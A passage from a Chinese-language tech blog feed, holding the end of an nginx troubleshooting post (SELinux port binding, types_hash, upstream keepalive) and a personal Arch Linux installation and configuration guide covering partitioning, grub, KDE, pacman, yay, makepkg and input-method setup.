<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ngx_http_request.c</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_http_wait_request_handler</span><span class="params">(<span class="type">ngx_event_t</span> *rev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    c-&gt;log-&gt;action = <span class="string">&quot;reading client request line&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ngx_reusable_connection</span>(c, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    c-&gt;data = <span class="built_in">ngx_http_create_request</span>(c);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-nginx网络模型"><a href="#2-nginx网络模型" class="headerlink" title="2. nginx网络模型"></a>2. nginx网络模型</h2><h3 id="2-1-网络模型总述"><a href="#2-1-网络模型总述" class="headerlink" title="2.1. 网络模型总述"></a>2.1. 网络模型总述</h3><ul>
<li>使用master进程监听端口创建套接字，然后fork子进程，每个子进程就可以复用监听套接字</li>
</ul>
<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-nginx启动报-emerg-bind-to-0-0-0-0-xxx-failed-13-Permission-denied"><a href="#1-nginx启动报-emerg-bind-to-0-0-0-0-xxx-failed-13-Permission-denied" class="headerlink" title="1. nginx启动报[emerg] bind() to 0.0.0.0:xxx failed (13: Permission denied)"></a>1. nginx启动报<code>[emerg] bind() to 0.0.0.0:xxx failed (13: Permission denied)</code></h2><ul>
<li>出现问题的设备是centos7，默认开启了selinux，对http监听的端口有范围限制</li>
<li>如果是小于1024是需要使用root运行，大于1024参照下面方案</li>
</ul>
<h3 id="方案1-关闭selinux"><a href="#方案1-关闭selinux" class="headerlink" title="方案1 关闭selinux"></a>方案1 关闭selinux</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看selinux当前状态</span></span><br><span class="line">getenforce</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置selinux关闭</span></span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>

<h3 id="方案2-使用semanage添加端口"><a href="#方案2-使用semanage添加端口" class="headerlink" title="方案2 使用semanage添加端口"></a>方案2 使用semanage添加端口</h3><ul>
<li>安装semanage自己百度</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看支持的http端口列表</span></span><br><span class="line">=&gt; semanage port -l | grep http_port_t</span><br><span class="line">http_port_t                    tcp      80, 81, 443, 488, 8008, 8009, 8443, 9000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加端口</span></span><br><span class="line">=&gt; semanage port -a -t http_port_t  -p tcp 8090</span><br></pre></td></tr></table></figure>

<h2 id="2-nginx报-warn-4992-4992-could-not-build-optimal-types-hash-you-should-increase-either-types-hash-max-size-1024-or-types-hash-bucket-size-64-ignoring-types-hash-bucket-size"><a href="#2-nginx报-warn-4992-4992-could-not-build-optimal-types-hash-you-should-increase-either-types-hash-max-size-1024-or-types-hash-bucket-size-64-ignoring-types-hash-bucket-size" class="headerlink" title="2. nginx报[warn] 4992#4992: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size"></a>2. nginx报<code>[warn] 4992#4992: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size</code></h2><ul>
<li>需要在http模块内部添加配置将<code>types_hash_max_size</code>调大</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    types_hash_max_size 4096;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-nginx反向代理后time-wait过多存在问题"><a href="#3-nginx反向代理后time-wait过多存在问题" class="headerlink" title="3. nginx反向代理后time_wait过多存在问题"></a>3. nginx反向代理后time_wait过多存在问题</h2><ul>
<li>在upstream中添加keep_alive选项，可以在一个tcp连接发送多个http请求，防止tcp连接过多而time_wait状态太多造成端口不可用的问题</li>
<li>需要同时设置http版本为1.1，connection为空</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream http_proxy &#123;</span><br><span class="line">    server 127.0.0.1:8080;</span><br><span class="line"></span><br><span class="line">    keepalive 16;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://http_proxy;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Connection &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>archlinux 安装和配置</title>
    <url>/blogs/2021-04-02-archlinux/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此文记录我将 archlinux 安装到使用的全过程，供记录备忘</p>
<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><p>iso 下载启动我就不多说了，自己搞定</p>
<h2 id="1-分区"><a href="#1-分区" class="headerlink" title="1. 分区"></a>1. 分区</h2><p>新硬盘需要先分区再安装系统，第一次手动命令行分区，可以激动一下</p>
<ol>
<li>想要 efi 启动，需要在头部创建一个 1G 的 efi 分区，格式化为fat32，标识要求是<code>EFI System</code>，挂载到<code>/boot/efi</code></li>
<li>需要交换分区，创建 swap 分区，大小自己定，一般内存两倍</li>
<li>根分区，后面两个想分，根分区给 30G 足以</li>
<li>&#x2F;opt 看着办，如果想重装不影响自己下的软件，可以分</li>
<li>&#x2F;home 看着办，如果想重装不影响自己平常使用的文件数据，可以分</li>
</ol>
<h3 id="1-1-GPT-分区"><a href="#1-1-GPT-分区" class="headerlink" title="1.1. GPT 分区"></a>1.1. GPT 分区</h3><p>GPT 分区表最多支持200个主分区</p>
<h3 id="1-2-MBR-分区"><a href="#1-2-MBR-分区" class="headerlink" title="1.2. MBR 分区"></a>1.2. MBR 分区</h3><p>MBR 分区表最大支持 2T，最多 4 个主分区，属于旧式分区表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始分区/dev/sda</span></span><br><span class="line">fdisk /dev/sda</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除已有分区</span></span><br><span class="line">d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建MBR分区表</span></span><br><span class="line">o</span><br></pre></td></tr></table></figure>

<p><strong>全是主分区的分区</strong></p>
<ol>
<li>&#x2F;opt 这个就放到逻辑分区就好了</li>
<li>&#x2F;home 这个就放到逻辑分区就好了</li>
</ol>
<p><strong>全是逻辑分区的分区</strong></p>
<p>只给 efi 分区作为主分区，其他全部逻辑分区<br>U 盘中这样搞启动时没检测到硬盘，GG 了</p>
<h2 id="2-安装配置"><a href="#2-安装配置" class="headerlink" title="2. 安装配置"></a>2. 安装配置</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1. 安装"></a>2.1. 安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt linux base linux-firmware networkmanager tmux sudo sed gvim grub net-tools efibootmgr archlinux-keyring pkgfile systemd-sysvcompat</span><br></pre></td></tr></table></figure>

<ul>
<li><code>systemd-sysvcompat</code>是为了生成<code>/sbin/init</code></li>
</ul>
<h3 id="2-2-配置"><a href="#2-2-配置" class="headerlink" title="2.2. 配置"></a>2.2. 配置</h3><ul>
<li>生成 linux 的 img</li>
<li>提示<code>/etc/mkinitcpio.d/linux.present</code>是空的，就从安装的iso里面拷贝过去</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkinitcpio -p linux</span><br></pre></td></tr></table></figure>

<h2 id="3-引导"><a href="#3-引导" class="headerlink" title="3. 引导"></a>3. 引导</h2><h3 id="3-1-安装引导"><a href="#3-1-安装引导" class="headerlink" title="3.1. 安装引导"></a>3.1. 安装引导</h3><h4 id="1-GPT-UEFI"><a href="#1-GPT-UEFI" class="headerlink" title="(1) GPT + UEFI"></a>(1) GPT + UEFI</h4><ol>
<li>gpt 下如果要使用 uefi 需要在整个磁盘前面有一个 efi 分区，大小 512M 就可以了，某些情况下需要这么大，如果没有特殊情况 2M 都能用</li>
<li>efi 分区需要磁盘类型为<code>EFI System</code></li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB</span><br></pre></td></tr></table></figure>

<h4 id="2-MBR-BIOS"><a href="#2-MBR-BIOS" class="headerlink" title="(2) MBR + BIOS"></a>(2) MBR + BIOS</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grub-install --target=i386-pc /dev/sda</span><br></pre></td></tr></table></figure>

<h3 id="3-2-grub-创建引导菜单"><a href="#3-2-grub-创建引导菜单" class="headerlink" title="3.2. grub 创建引导菜单"></a>3.2. grub 创建引导菜单</h3><ul>
<li>如果想要探测其他分区的系统，需要安装 os-prober，并且在<code>/etc/default/grub</code>添加<code>GRUB_DISABLE_OS_PROBER=false</code></li>
<li>需要将需要启动系统的磁盘先挂载好再执行</li>
<li>执行下面语句添加引导菜单</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<h2 id="4-桌面环境"><a href="#4-桌面环境" class="headerlink" title="4. 桌面环境"></a>4. 桌面环境</h2><h3 id="4-1-kde"><a href="#4-1-kde" class="headerlink" title="4.1. kde"></a>4.1. kde</h3><ul>
<li>安装下面的包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S plasma kde-applications xorg-server xorg-drivers sddm</span><br></pre></td></tr></table></figure>

<h4 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h4><h5 id="1-屏幕显示抖动，设置页面点击没有变化等异常问题"><a href="#1-屏幕显示抖动，设置页面点击没有变化等异常问题" class="headerlink" title="(1) 屏幕显示抖动，设置页面点击没有变化等异常问题"></a>(1) 屏幕显示抖动，设置页面点击没有变化等异常问题</h5><ul>
<li>尝试将<code>xorg.conf</code>的<code>driver</code>改成</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Driver      &quot;modesetting&quot;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-开机默认启用小键盘"><a href="#4-2-开机默认启用小键盘" class="headerlink" title="4.2. 开机默认启用小键盘"></a>4.2. 开机默认启用小键盘</h3><ul>
<li>安装<code>numlockx</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S numlockx</span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>/etc/sddm.conf</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[General]</span><br><span class="line">Numlock=on</span><br></pre></td></tr></table></figure>

<h2 id="5-中文配置"><a href="#5-中文配置" class="headerlink" title="5. 中文配置"></a>5. 中文配置</h2><h3 id="5-1-安装字体"><a href="#5-1-安装字体" class="headerlink" title="5.1. 安装字体"></a>5.1. 安装字体</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S wqy-microhei</span><br></pre></td></tr></table></figure>

<h2 id="6-字体"><a href="#6-字体" class="headerlink" title="6. 字体"></a>6. 字体</h2><table>
<thead>
<tr>
<th>font</th>
<th>package</th>
</tr>
</thead>
<tbody><tr>
<td>consola</td>
<td>ttf-vista-fonts(aur)</td>
</tr>
</tbody></table>
<h2 id="7-wifi配置"><a href="#7-wifi配置" class="headerlink" title="7. wifi配置"></a>7. wifi配置</h2><ul>
<li>需要安装<code>iwd</code>包</li>
</ul>
<h2 id="8-NetworkManager配置"><a href="#8-NetworkManager配置" class="headerlink" title="8. NetworkManager配置"></a>8. NetworkManager配置</h2><ul>
<li>networkmanager使用nmcli配置</li>
</ul>
<h3 id="8-1-nmcli基本使用"><a href="#8-1-nmcli基本使用" class="headerlink" title="8.1. nmcli基本使用"></a>8.1. nmcli基本使用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接</span></span><br><span class="line">=&gt; nmcli conn show</span><br><span class="line">NAME    UUID                                  TYPE      DEVICE</span><br><span class="line">enp0s3  9a364675-b60a-479a-8d4a-754bab3dfe01  ethernet  enp0s3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置dhcp获取ip</span></span><br><span class="line">=&gt; nmcli conn add type ethernet con-name enp0s3-dhcp ifname enp0s3 ipv4.method auto ipv4.dns 114.114.114.114,8.8.8.8</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除连接</span></span><br><span class="line">=&gt; nmcli conn delete enp0s3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接</span></span><br><span class="line">=&gt; nmcli conn show</span><br><span class="line">NAME          UUID                                  TYPE      DEVICE</span><br><span class="line">enp0s3-dhcp   9a364675-b60a-479a-8d4a-754bab3dfe01  ethernet  --</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用连接</span></span><br><span class="line">=&gt; nmcli conn up enp0s3-dhcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接</span></span><br><span class="line">=&gt; nmcli conn show</span><br><span class="line">NAME          UUID                                  TYPE      DEVICE</span><br><span class="line">enp0s3-dhcp   9a364675-b60a-479a-8d4a-754bab3dfe01  ethernet  enp0s3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置</span></span><br><span class="line">=&gt; nmcli conn modify enp0s3-dhcp ipv4.dns 114.114.114.114</span><br></pre></td></tr></table></figure>

<h1 id="二、日常操作"><a href="#二、日常操作" class="headerlink" title="二、日常操作"></a>二、日常操作</h1><h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1. 常用命令"></a>1. 常用命令</h2><h3 id="1-1-pacman-安装软件"><a href="#1-1-pacman-安装软件" class="headerlink" title="1.1. pacman 安装软件"></a>1.1. pacman 安装软件</h3><h4 id="1-一些基本用法"><a href="#1-一些基本用法" class="headerlink" title="1) 一些基本用法"></a>1) 一些基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### S --sync 同步（安装搜索） ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将系统所有软件更新到最新</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">y 同步最新仓库</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">u update</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--noconfirm 不用输入Y</span></span><br><span class="line">sudo pacman -Syu --noconfirm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装软件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--needed 软件已经是最新，不用重新安装</span></span><br><span class="line">sudo pacman -S --needed xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">s 搜索软件</span></span><br><span class="line">sudo pacman -Sys xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c 从缓存仓库清理旧包，cc清理所有</span></span><br><span class="line">sudo pacman -Scc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--overwrite <span class="string">&quot;*&quot;</span> 遇到冲突文件，强制覆盖</span></span><br><span class="line">sudo pacman -S xxx --overwrite &quot;*&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### R --remove 移除 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">u 移除用不到的包</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">s 递归移除用不到的依赖</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">n 删除配置文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c 移除包和依赖它的包</span></span><br><span class="line">sudo pacman -Rusnc xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### Q --query 查询（本地） ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">d 列出作为依赖项安装的包</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">t 列出不被其他包需要的包</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">q 只展示包名，不展示版本号</span></span><br><span class="line">sudo pacman -Qdtq</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看哪些包可以更新</span></span><br><span class="line">sudo pacman -Qu</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看二进制是哪个包安装进来的</span></span><br><span class="line">sudo pacman -Qo /usr/sbin/tcpdump</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看包安装了哪些文件</span></span><br><span class="line">sudo pacman -Ql tcpdump</span><br></pre></td></tr></table></figure>

<h4 id="2-镜像源选择"><a href="#2-镜像源选择" class="headerlink" title="2) 镜像源选择"></a>2) 镜像源选择</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装reflector</span></span><br><span class="line">sudo pacman -S reflector</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑/etc/xdg/reflector/reflector.conf</span></span><br><span class="line">vim /etc/xdg/reflector/reflector.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成mirrorlist</span></span><br><span class="line">sudo reflector @/etc/xdg/reflector/reflector.conf</span><br></pre></td></tr></table></figure>

<h4 id="踩坑记-1"><a href="#踩坑记-1" class="headerlink" title="踩坑记"></a><strong><font color="red">踩坑记</font></strong></h4><ol>
<li>遇到安装提示<code>PGP Signature</code>错误的，安装一下<code>archlinux-keyring</code>，原因是签名过期了</li>
</ol>
<h3 id="1-2-journalctl"><a href="#1-2-journalctl" class="headerlink" title="1.2. journalctl"></a>1.2. journalctl</h3><h4 id="1-2-1-一些基本用法"><a href="#1-2-1-一些基本用法" class="headerlink" title="1.2.1. 一些基本用法"></a>1.2.1. 一些基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看日志的磁盘使用量</span></span><br><span class="line">sudo journalctl --disk-usage</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理5天之前的日志</span></span><br><span class="line">sudo journalctl --vacuum-time=5d</span><br></pre></td></tr></table></figure>

<h2 id="2-一些命令所在的包"><a href="#2-一些命令所在的包" class="headerlink" title="2. 一些命令所在的包"></a>2. 一些命令所在的包</h2><table>
<thead>
<tr>
<th>命令</th>
<th>包名</th>
</tr>
</thead>
<tbody><tr>
<td>lsusb</td>
<td>usbutils</td>
</tr>
<tr>
<td>arch-chroot<br>genfstab</td>
<td>arch-install-scripts</td>
</tr>
<tr>
<td>netstat</td>
<td>net-tools</td>
</tr>
<tr>
<td>telnet</td>
<td>inetutils</td>
</tr>
<tr>
<td>ntpdate</td>
<td>ntp</td>
</tr>
<tr>
<td>nslookup</td>
<td>bind</td>
</tr>
</tbody></table>
<h3 id="2-1-查找命令对应的包"><a href="#2-1-查找命令对应的包" class="headerlink" title="2.1. 查找命令对应的包"></a>2.1. 查找命令对应的包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; sudo pacman -S pkgfile</span><br><span class="line">=&gt; sudo pkgfile -u</span><br><span class="line">=&gt; pkgfile -s netstat</span><br><span class="line">core/net-tools</span><br><span class="line">community/munin-node</span><br></pre></td></tr></table></figure>

<h2 id="3-aur软件包"><a href="#3-aur软件包" class="headerlink" title="3. aur软件包"></a>3. aur软件包</h2><ul>
<li>aurhelper很多，我一般使用yay进行aur包安装</li>
</ul>
<h3 id="3-1-yay"><a href="#3-1-yay" class="headerlink" title="3.1. yay"></a>3.1. yay</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1) 安装"></a>1) 安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要go、fakeroot环境</span></span><br><span class="line">sudo pacman -S go fakeroot</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">clone</span>仓库</span></span><br><span class="line">git clone https://aur.archlinux.org/yay.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">cd yay &amp;&amp; makepkg -si</span><br></pre></td></tr></table></figure>

<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2) 使用"></a>2) 使用</h4><ul>
<li>yay可以使用所有pacman能用的命令选项</li>
<li>下面列举一些pacman没有的命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印当前yay的配置选项</span></span><br><span class="line">yay -Pg</span><br></pre></td></tr></table></figure>

<h2 id="4-信任CA证书"><a href="#4-信任CA证书" class="headerlink" title="4. 信任CA证书"></a>4. 信任CA证书</h2><ul>
<li>执行完需要重启浏览器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看已经授信的ca机构</span></span><br><span class="line">trust list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加授信的ca机构</span></span><br><span class="line">trust anchor /path/to/cacert.pem</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">移除授信的ca机构，值由list给出</span></span><br><span class="line">trust anchor --remove &#x27;pkcs11:id=%2E%57%67%B4%D5%D0%13%93%52%B5%4F%7C%87%1C%FC%45%43%FF%E7%02;type=cert&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="5-下载安装包的源码"><a href="#5-下载安装包的源码" class="headerlink" title="5. 下载安装包的源码"></a>5. 下载安装包的源码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装asp</span></span><br><span class="line">sudo pacman -S asp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索安装包</span></span><br><span class="line">asp list-all | grep linux</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">到一个目录，下载安装包编译脚本</span></span><br><span class="line">cd /path/to/dir</span><br><span class="line">asp checkout linux</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入下载安装包源码和安装依赖，要找到PKGBUILD所在的目录</span></span><br><span class="line">cd linux</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只下载源码，不编译，并且安装依赖，不检查PGP签名</span></span><br><span class="line">makepkg -so --skippgpcheck</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译不安装</span></span><br><span class="line">makepkg</span><br></pre></td></tr></table></figure>

<h2 id="6-makepkg-编译archlinux的软件安装包"><a href="#6-makepkg-编译archlinux的软件安装包" class="headerlink" title="6. makepkg 编译archlinux的软件安装包"></a>6. makepkg 编译archlinux的软件安装包</h2><h3 id="6-1-常用选项"><a href="#6-1-常用选项" class="headerlink" title="6.1. 常用选项"></a>6.1. 常用选项</h3><ul>
<li><code>-s</code>: 安装编译依赖</li>
<li><code>-d</code>: 跳过依赖检查</li>
<li><code>-o</code>: 只下载源码并解压，不编译</li>
<li><code>-r</code>: 在安装完成后移除安装依赖</li>
<li><code>--skippgpcheck</code>: 不检查PGP签名</li>
</ul>
<h3 id="6-2-git仓库太大无法clone的解决"><a href="#6-2-git仓库太大无法clone的解决" class="headerlink" title="6.2. git仓库太大无法clone的解决"></a>6.2. git仓库太大无法clone的解决</h3><ul>
<li>先使用命令<code>makepkg -o</code>，然后使用<code>ps auxf</code>查看git的clone命令</li>
<li>在对应目录下执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add origin https://xxx/xxx/xxx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取代码</span></span><br><span class="line">while true; do git fetch; if [ &quot;$?&quot; -eq 0 ]; then break; fi; sleep 1; done</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取所有tag</span></span><br><span class="line">git fetch --tags</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换分支</span></span><br><span class="line">git checkout FETCH_HEAD</span><br></pre></td></tr></table></figure>

<ul>
<li>然后在上一级重新执行<code>makepkg -o</code></li>
</ul>
<h1 id="三、好用的工具"><a href="#三、好用的工具" class="headerlink" title="三、好用的工具"></a>三、好用的工具</h1><h2 id="1-kde-桌面下"><a href="#1-kde-桌面下" class="headerlink" title="1. kde 桌面下"></a>1. kde 桌面下</h2><h3 id="1-1-xpad-桌面便签"><a href="#1-1-xpad-桌面便签" class="headerlink" title="1.1. xpad 桌面便签"></a>1.1. xpad 桌面便签</h3><h4 id="1-快捷键"><a href="#1-快捷键" class="headerlink" title="(1) 快捷键"></a>(1) 快捷键</h4><ul>
<li><code>Ctrl + 鼠标</code>: 拖动位置</li>
</ul>
<h3 id="1-2-goldendict-翻译工具，支持鼠标取词"><a href="#1-2-goldendict-翻译工具，支持鼠标取词" class="headerlink" title="1.2. goldendict 翻译工具，支持鼠标取词"></a>1.2. goldendict 翻译工具，支持鼠标取词</h3><ul>
<li>这个并不是说翻译的多精准，主要是可以各种自定义翻译来源</li>
<li>配合命令行翻译工具就很神奇了</li>
</ul>
<h4 id="1-配合使用-translate-shell-结果"><a href="#1-配合使用-translate-shell-结果" class="headerlink" title="(1) 配合使用 translate-shell 结果"></a>(1) 配合使用 translate-shell 结果</h4><ul>
<li>在<code>Edit -&gt; Dictionary</code>里面找到 Program，然后新建</li>
</ul>
<table>
<thead>
<tr>
<th>Enabled</th>
<th>Type</th>
<th>Name</th>
<th>Command Line</th>
<th>Icon</th>
</tr>
</thead>
<tbody><tr>
<td>$\surd$</td>
<td>Plain Text</td>
<td>trans</td>
<td>trans en:zh %GDWORD% -no-ansi</td>
<td></td>
</tr>
</tbody></table>
<h3 id="1-2-fcitx5-输入法"><a href="#1-2-fcitx5-输入法" class="headerlink" title="1.2. fcitx5 输入法"></a>1.2. fcitx5 输入法</h3><h4 id="1-安装-1"><a href="#1-安装-1" class="headerlink" title="(1) 安装"></a>(1) 安装</h4><ul>
<li>需要安装<code>fcitx5-im</code>基础包和<code>fcitx5-chinese-addons</code>中文输入包</li>
<li>在桌面系统中配置开机启动，程序路径通过<code>which fcitx5</code></li>
<li>安装完成后，需要在环境变量配置一下，不然命令行会用不了</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/environment</span></span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br></pre></td></tr></table></figure>

<ul>
<li>安装完成后找到<code>fcitx5-configure</code>配置自己输入习惯</li>
</ul>
<p><strong>主题</strong></p>
<ul>
<li>github 搜索<code>fcitx5-themes</code>下载后，将里面的文件夹拷贝到<code>~/.local/share/fcitx5/themes</code>下就可以配置了</li>
</ul>
<h4 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="(2) 注意事项"></a>(2) 注意事项</h4><p><strong>1. 无法输入中文方括号</strong></p>
<ul>
<li>需要修改<code>/usr/share/fcitx5/punctuation/punc.mb.zh_CN</code></li>
<li>将下面两行修改一下，重启fcitx5即可</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ ·</span><br><span class="line">] 「 」</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">改成</span></span><br><span class="line">[ 【</span><br><span class="line">] 】</span><br></pre></td></tr></table></figure>

<h3 id="1-3-wps"><a href="#1-3-wps" class="headerlink" title="1.3. wps"></a>1.3. wps</h3><h4 id="1-安装-2"><a href="#1-安装-2" class="headerlink" title="1) 安装"></a>1) 安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wps-office-mui-zh-cn是为了安装中文语言包</span></span><br><span class="line">yay -S wps-office-cn wps-office-mui-zh-cn</span><br></pre></td></tr></table></figure>

<h4 id="2-无法打开中文路径"><a href="#2-无法打开中文路径" class="headerlink" title="2) 无法打开中文路径"></a>2) 无法打开中文路径</h4><ul>
<li>将设置中的<code>Region settings</code>-&gt;<code>Region&amp;Language</code>里面的部分选项改成<code>zh_CN.UTF-8</code>，重启电脑就好了</li>
</ul>
<h3 id="1-4-远程桌面"><a href="#1-4-远程桌面" class="headerlink" title="1.4. 远程桌面"></a>1.4. 远程桌面</h3><h4 id="1-类似teamviewer，两边都能看到"><a href="#1-类似teamviewer，两边都能看到" class="headerlink" title="1) 类似teamviewer，两边都能看到"></a>1) 类似teamviewer，两边都能看到</h4><ul>
